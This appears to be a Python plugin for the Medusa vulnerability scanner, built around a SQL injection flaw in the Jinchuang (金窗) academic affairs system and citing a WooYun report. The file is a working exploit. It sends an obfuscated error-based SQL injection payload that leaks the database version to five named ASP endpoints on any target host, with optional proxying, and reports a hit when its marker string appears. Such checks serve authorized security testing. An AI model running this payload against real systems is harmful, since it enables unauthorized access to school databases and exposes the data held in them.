#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: 金窗教务系统存在多处SQL注射漏洞
referer: http://www.wooyun.org/bugs/wooyun-2010-0101234
author: Lucifer
description: 金窗教务系统多处SQL注入。
'''
import urllib
import requests

def UrlProcessing(url):
    if url.startswith("http"):#判断是否有http头，如果没有就在下面加入
        res = urllib.parse.urlparse(url)
    else:
        res = urllib.parse.urlparse('http://%s' % url)
    return res.scheme, res.hostname, res.port

payload = "%27AnD%201=CoNvErT(InT,(ChAr(71)%2BChAr(65)%2BChAr(79)%2BChAr(32)%2BChAr(74)%2BChAr(73)%2BChAr(64)%2B@@VeRsIon%20))%20AnD%20%27a%27=%27a"
urls = ["/jiaoshi/shizi/shizi/textbox.asp?id=1",
        "/jiaoshi/sj/shixi/biyeshan1.asp?id=1",
        "/jiaoshi/sj/shiyan/xuankeda.asp?bianhao=1",
        "/jiaoshi/xueji/dangan/sdangangai1.asp?id=1",
        "/jiaoshi/xueji/shen/autobh.asp?jh=1"]
def medusa(Url,RandomAgent,ProxyIp):

    scheme, url, port = UrlProcessing(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    global   resp

    headers = {
        'Accept-Encoding': 'gzip, deflate',
        'Accept': '*/*',
        'User-Agent': RandomAgent,
    }
    try:
        #s = requests.session()
        for turl in urls:
            payload_url = scheme + "://" + url +turl + payload
            if ProxyIp!=None:
                proxies = {
                    # "http": "http://" + str(ProxyIps) , # 使用代理前面一定要加http://或者https://
                    "http": "http://" + str(ProxyIp)
                }
                resp = requests.get(payload_url, headers=headers, proxies=proxies, timeout=5, verify=False)
            elif ProxyIp==None:
                resp = requests.get(payload_url, headers=headers, timeout=5, verify=False)
            con = resp.text
            code = resp.status_code
            if con.lower().find('gao ji@microsoft')!=-1:
                Medusa = "{} 存在金窗教务系统存在多处SQL注射漏洞\r\n漏洞详情:\r\nPayload:{}\r\n".format(url, payload_url)
                return (Medusa)
    except Exception as e:
        pass